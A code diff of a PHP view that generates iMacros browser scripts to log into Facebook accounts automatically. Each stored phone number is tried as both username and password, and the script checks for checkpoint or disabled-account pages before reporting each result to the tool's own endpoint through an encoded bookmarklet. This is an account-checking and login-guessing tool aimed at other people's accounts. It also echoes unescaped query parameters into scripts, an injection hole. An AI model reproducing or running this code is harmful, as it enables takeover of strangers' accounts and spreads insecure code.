@@ -12,16 +12,30 @@
     </div>
 
     <?php
+    $UserTable = new Mod_general ();
+    $getBrowser = $UserTable->getBrowser()['name'];
+
     $log_id = $this->session->userdata('user_id');
     $email = $this->session->userdata('email');
     $type = $this->session->userdata('user_type');
+    $checkMy = parse_url(@$_GET['checkMy']);
+    if(!empty($_GET['checkMy'])) {
+        if(!preg_match('/login/', @$_GET['checkMy'])) {
+            if(!empty($result) && empty($checkMy['query'])) {
+                echo '<script language="javascript" type="text/javascript">window.setTimeout( function(){window.location = "'.base_url().'Facebook/fbnumset?status='.$_GET['status'].'&id='.$resultData->id.'&num='.$resultData->f_phone.'&u='.$log_id.'&e='.$email.'&t='.$type.'&total='.$_GET['total'].'";}, 3 );</script>';
+                exit();
+            }
+        }
+    }
+
      if(!empty($result) && !empty($_GET['status'])):
-        $resultData = $result[0];
+        $resultData = @$result[0];
         ?>
         <script type="text/javascript">
-        window.location ="<?php echo base_url();?>Facebook/fbnumset?status=<?php echo $_GET['status'];?>&id=<?php echo $resultData->id;?>&num=<?php echo $resultData->f_phone;?>&u=<?php echo $log_id;?>&e=<?php echo $email;?>&t=<?php echo $type;?>&total=<?php echo $_GET['total'];?>";
+        window.location ="<?php echo base_url();?>Facebook/fbnumset?status=<?php echo @$_GET['status'];?>&id=<?php echo $resultData->id;?>&num=<?php echo $resultData->f_phone;?>&u=<?php echo $log_id;?>&e=<?php echo $email;?>&t=<?php echo $type;?>&total=<?php echo $_GET['total'];?>";
         </script>
     <?php elseif(!empty($result) && empty($_GET['status'])):
+
         $resultData = $result[0];
         $userName = $resultData->f_name;
         $url = $resultData->f_lname;
@@ -31,33 +45,66 @@
         $id = $resultData->id;
         $t = '300';
         $total = !empty($_GET['total']) ? $_GET['total'] : 1;
-        $tranferGroup = 'code = &quot;&quot;;';
-        $tranferGroup .= 'code+=&quot;CLEAR\n&quot;;';
-        $tranferGroup .= 'code+=&quot;URL GOTO=https://m.facebook.com/home.php\n&quot;;';
-        $tranferGroup .= 'iimPlayCode(codedefault2+code);';
-        $tranferGroup .= 'function do_logout(){code = &quot;&quot;;code+=&quot;URL GOTO=https://m.facebook.com/'.$userId.'\n&quot;;code += &quot;TAG POS=1 TYPE=A ATTR=HREF:*logout.php*\n&quot;;iimPlayCode(codedefault2+code);}';
-        $tranferGroup .= 'var QueryString=function(){var query_string={};var query=window.location.search.substring(1);var vars=query.split("&amp;");for(var i=0;i&lt;vars.length;i++){var pair=vars[i].split("=");if(typeof query_string[pair[0]]==="undefined"){query_string[pair[0]]=decodeURIComponent(pair[1]);}else if(typeof query_string[pair[0]]==="string"){var arr=[query_string[pair[0]],decodeURIComponent(pair[1])];query_string[pair[0]]=arr;}else{query_string[pair[0]].push(decodeURIComponent(pair[1]));}}return query_string;}();';
-        $tranferGroup .= 'if(!QueryString.next) {do_logout();}';
-        $tranferGroup .= 'code = &quot;&quot;;';
-        $tranferGroup .= 'code += &quot;WAIT SECONDS=2\n&quot;;';
-        $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:TEXT FORM=ID:login_form ATTR=NAME:email CONTENT='.$phoneNumber.'\n&quot;;';
-        $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:PASSWORD FORM=ID:login_form ATTR=NAME:pass CONTENT='.$phone.'\n&quot;;';
-        $tranferGroup .= 'code += &quot;WAIT SECONDS=20\n&quot;;';
-        $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:SUBMIT FORM=ID:login_form ATTR=NAME:login\n&quot;;';
-        $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:SUBMIT FORM=ID:login_form ATTR=NAME:login EXTRACT=TXT\n&quot;;';
-        $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=H3 ATTR=ID:checkpoint_title EXTRACT=TXT\n&quot;;';
-        $tranferGroup .= 'code += &quot;WAIT SECONDS=2\n&quot;;';
-        $tranferGroup .= 'iimPlayCode(codedefault2+code);';
-        $tranferGroup .= 'var codeEx = iimGetLastExtract(1).replace(/ /g, "<sp>").replace(/\n/g, "<br>");';
-        $tranferGroup .= 'var codeEx2 = iimGetLastExtract(2).replace(/ /g, "<sp>").replace(/\n/g, "<br>");';
-        $tranferGroup .= 'var QueryString=function(){var query_string={};var query=window.location.search.substring(1);var vars=query.split("&amp;");for(var i=0;i&lt;vars.length;i++){var pair=vars[i].split("=");if(typeof query_string[pair[0]]==="undefined"){query_string[pair[0]]=decodeURIComponent(pair[1]);}else if(typeof query_string[pair[0]]==="string"){var arr=[query_string[pair[0]],decodeURIComponent(pair[1])];query_string[pair[0]]=arr;}else{query_string[pair[0]].push(decodeURIComponent(pair[1]));}}return query_string;}();';
-        $tranferGroup .= 'var fb_status=1; if(codeEx  == &quot;LogIn&quot;) {fb_status=&quot;no&quot;;}; if(codeEx2  == &quot;PleaseConfirmYourIdentity&quot;) {fb_status=1;};if(codeEx2=="YourAccountHasBeenDisabled"){fb_status="no";}; if(QueryString.login_try_number) {fb_status=&quot;no&quot;;}';
-        $tranferGroup .= 'code = &quot;&quot;;';
-        $tranferGroup .= 'code+=&quot;CLEAR\n&quot;;';
-        $tranferGroup .= 'code+=&quot;URL GOTO='.base_url().'Facebook/checknum?status=&quot; + fb_status + &quot;&u='.$log_id . '&e='.$email.'&t='.$type.'&total=&quot; + total + &quot;&checkMy=&quot; + codeEx2 + &quot;\n&quot;;';
-        $tranferGroup .= 'iimPlayCode(codedefault2+code);';         
+        if($getBrowser =='Google Chrome') {
+            $tranferGroup = 'SET !TIMEOUT_PAGE 3600
+URL GOTO=https://wwww.facebook.com/login/device-based/regular/login/
+WAIT SECONDS=3 
+TAG POS=1 TYPE=INPUT:TEXT FORM=ID:login_form ATTR=ID:email CONTENT='.$phoneNumber.' 
+SET !ENCRYPTION NO
+TAG POS=1 TYPE=INPUT:PASSWORD FORM=ID:login_form ATTR=ID:pass CONTENT='.$phone.'
+WAIT SECONDS=3 
+TAG POS=1 TYPE=BUTTON FORM=ID:login_form ATTR=ID:loginbutton  
+WAIT SECONDS=5 
+SET !VAR1 {{!URLCURRENT}}
+SET !VAR2 '.$log_id . '
+SET !VAR3 '.$email . '
+SET !VAR4 '.$type . '
+SET !VAR5 '.$total . '
+URL GOTO='.base_url().'Facebook/checknum?status=no&u={{!VAR2}}&e={{!VAR3}}&t={{!VAR4}}&total={{!VAR5}}&checkMy={{!VAR1}}
+';       
+if(preg_match('/confirmemail/', @$_GET['checkMy'])){
+    $tranferGroup = 'SET !TIMEOUT_PAGE 3600
+URL GOTO=https://wwww.facebook.com/login/device-based/regular/login/
+WAIT SECONDS=3 
+CLEAR
+SET !VAR1 {{!URLCURRENT}}
+SET !VAR2 '.$log_id . '
+SET !VAR3 '.$email . '
+SET !VAR4 '.$type . '
+SET !VAR5 '.$total . '
+URL GOTO='.base_url().'Facebook/checknum?status=no&u={{!VAR2}}&e={{!VAR3}}&t={{!VAR4}}&total={{!VAR5}}&checkMy={{!VAR1}}
+'; 
+}
+        } else {
+            $tranferGroup = 'code = &quot;&quot;;';
+            $tranferGroup .= 'code+=&quot;CLEAR\n&quot;;';
+            $tranferGroup .= 'code+=&quot;URL GOTO=https://m.facebook.com/home.php\n&quot;;';
+            $tranferGroup .= 'iimPlayCode(codedefault2+code);';
+            $tranferGroup .= 'function do_logout(){code = &quot;&quot;;code+=&quot;URL GOTO=https://m.facebook.com/'.$userId.'\n&quot;;code += &quot;TAG POS=1 TYPE=A ATTR=HREF:*logout.php*\n&quot;;iimPlayCode(codedefault2+code);}';
+            $tranferGroup .= 'var QueryString=function(){var query_string={};var query=window.location.search.substring(1);var vars=query.split("&amp;");for(var i=0;i&lt;vars.length;i++){var pair=vars[i].split("=");if(typeof query_string[pair[0]]==="undefined"){query_string[pair[0]]=decodeURIComponent(pair[1]);}else if(typeof query_string[pair[0]]==="string"){var arr=[query_string[pair[0]],decodeURIComponent(pair[1])];query_string[pair[0]]=arr;}else{query_string[pair[0]].push(decodeURIComponent(pair[1]));}}return query_string;}();';
+            $tranferGroup .= 'if(!QueryString.next) {do_logout();}';
+            $tranferGroup .= 'code = &quot;&quot;;';
+            $tranferGroup .= 'code += &quot;WAIT SECONDS=2\n&quot;;';
+            $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:TEXT FORM=ID:login_form ATTR=NAME:email CONTENT='.$phoneNumber.'\n&quot;;';
+            $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:PASSWORD FORM=ID:login_form ATTR=NAME:pass CONTENT='.$phone.'\n&quot;;';
+            $tranferGroup .= 'code += &quot;WAIT SECONDS=20\n&quot;;';
+            $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:SUBMIT FORM=ID:login_form ATTR=NAME:login\n&quot;;';
+            $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:SUBMIT FORM=ID:login_form ATTR=NAME:login EXTRACT=TXT\n&quot;;';
+            $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=H3 ATTR=ID:checkpoint_title EXTRACT=TXT\n&quot;;';
+            $tranferGroup .= 'code += &quot;WAIT SECONDS=2\n&quot;;';
+            $tranferGroup .= 'iimPlayCode(codedefault2+code);';
+            $tranferGroup .= 'var codeEx = iimGetLastExtract(1).replace(/ /g, "<sp>").replace(/\n/g, "<br>");';
+            $tranferGroup .= 'var codeEx2 = iimGetLastExtract(2).replace(/ /g, "<sp>").replace(/\n/g, "<br>");';
+            $tranferGroup .= 'var QueryString=function(){var query_string={};var query=window.location.search.substring(1);var vars=query.split("&amp;");for(var i=0;i&lt;vars.length;i++){var pair=vars[i].split("=");if(typeof query_string[pair[0]]==="undefined"){query_string[pair[0]]=decodeURIComponent(pair[1]);}else if(typeof query_string[pair[0]]==="string"){var arr=[query_string[pair[0]],decodeURIComponent(pair[1])];query_string[pair[0]]=arr;}else{query_string[pair[0]].push(decodeURIComponent(pair[1]));}}return query_string;}();';
+            $tranferGroup .= 'var fb_status=1; if(codeEx  == &quot;LogIn&quot;) {fb_status=&quot;no&quot;;}; if(codeEx2  == &quot;PleaseConfirmYourIdentity&quot;) {fb_status=1;};if(codeEx2=="YourAccountHasBeenDisabled"){fb_status="no";}; if(QueryString.login_try_number) {fb_status=&quot;no&quot;;}';
+            $tranferGroup .= 'code = &quot;&quot;;';
+            $tranferGroup .= 'code+=&quot;CLEAR\n&quot;;';
+            $tranferGroup .= 'code+=&quot;URL GOTO='.base_url().'Facebook/checknum?status=&quot; + fb_status + &quot;&u='.$log_id . '&e='.$email.'&t='.$type.'&total=&quot; + total + &quot;&checkMy=&quot; + codeEx2 + &quot;\n&quot;;';
+            $tranferGroup .= 'iimPlayCode(codedefault2+code);';     
+        }
+            
         ?>  
-        <code id="examplecode5" style="width:300px;overflow:hidden;display:none">var contents=null,images=null,groups=null,setIdAccout=null,postingOn=0,total=<?php echo @$total;?>;var codedefault1=&quot;TAB CLOSEALLOTHERS\n SET !EXTRACT_TEST_POPUP NO\n SET !TIMEOUT_PAGE 100\n SET !ERRORIGNORE YES\n SET !TIMEOUT_STEP 0.1\n&quot;;var codedefault2=&quot;SET !EXTRACT_TEST_POPUP NO\n SET !TIMEOUT_PAGE 10\n SET !ERRORIGNORE YES\n SET !TIMEOUT_STEP 0.1\n&quot;;var wm=Components.classes[&quot;@mozilla.org/appshell/window-mediator;1&quot;].getService(Components.interfaces.nsIWindowMediator);var window=wm.getMostRecentWindow(&quot;navigator:browser&quot;);<?php echo @$tranferGroup;?>iimPlay('CODE:WAIT SECONDS=0');</code>  
+        <code id="examplecode5" style="width:300px;overflow:hidden;display:none"><?php if($getBrowser =='Google Chrome'):?><?php echo @$tranferGroup;?><?php else:?>var contents=null,images=null,groups=null,setIdAccout=null,postingOn=0,total=<?php echo @$total;?>;var codedefault1=&quot;TAB CLOSEALLOTHERS\n SET !EXTRACT_TEST_POPUP NO\n SET !TIMEOUT_PAGE 100\n SET !ERRORIGNORE YES\n SET !TIMEOUT_STEP 0.1\n&quot;;var codedefault2=&quot;SET !EXTRACT_TEST_POPUP NO\n SET !TIMEOUT_PAGE 10\n SET !ERRORIGNORE YES\n SET !TIMEOUT_STEP 0.1\n&quot;;var wm=Components.classes[&quot;@mozilla.org/appshell/window-mediator;1&quot;].getService(Components.interfaces.nsIWindowMediator);var window=wm.getMostRecentWindow(&quot;navigator:browser&quot;);<?php echo @$tranferGroup;?>iimPlay('CODE:WAIT SECONDS=0');<?php endif;?></code>  
     <script type="text/javascript">
         function getattra(e) {
             $("#singerimageFist").val(e);
@@ -71,6 +118,10 @@
             loading();
             var str = $("#examplecode5").text();
             var code = str;
+            <?php if($getBrowser =='Google Chrome'):?>
+                code = "javascript:(function() {try{var e_m64 = \"" + btoa(code) + "\", n64 = \"JTIzQ3VycmVudC5paW0=\";if(!/^(?:chrome|https?|file)/.test(location)){alert(\"iMacros: Open webpage to run a macro.\");return;}var macro = {};macro.source = atob(e_m64);macro.name = decodeURIComponent(atob(n64));var evt = document.createEvent(\"CustomEvent\");evt.initCustomEvent(\"iMacrosRunMacro\", true, true, macro);window.dispatchEvent(evt);}catch(e){alert(\"iMacros Bookmarklet error: \"+e.toString());}}) ();";
+                location.href = code;
+            <?php else:?>
             if (/imacros_sozi/.test(code)) {
                 codeiMacros = eval(code);
                 if (codeiMacros) {
@@ -87,9 +138,13 @@
                 code = "javascript:(function() {try{var e_m64 = \"" + btoa(code) + "\", n64 = \"JTIzQ3VycmVudC5paW0=\";if(!/^(?:chrome|https?|file)/.test(location)){alert(\"iMacros: Open webpage to run a macro.\");return;}var macro = {};macro.source = atob(e_m64);macro.name = decodeURIComponent(atob(n64));var evt = document.createEvent(\"CustomEvent\");evt.initCustomEvent(\"iMacrosRunMacro\", true, true, macro);window.dispatchEvent(evt);}catch(e){alert(\"iMacros Bookmarklet error: \"+e.toString());}}) ();";
                 location.href = code;
             }
+            <?php endif;?>
         }
         //runCode();
         <?php if(!empty($_GET['next'])):?>
+            window.setTimeout( function(){runCode()}, 2000 );
+        <?php endif;?>
+        <?php if(preg_match('/confirmemail/', @$_GET['checkMy'])):?>
             window.setTimeout( function(){runCode()}, 2000 );
         <?php endif;?>
     </script>
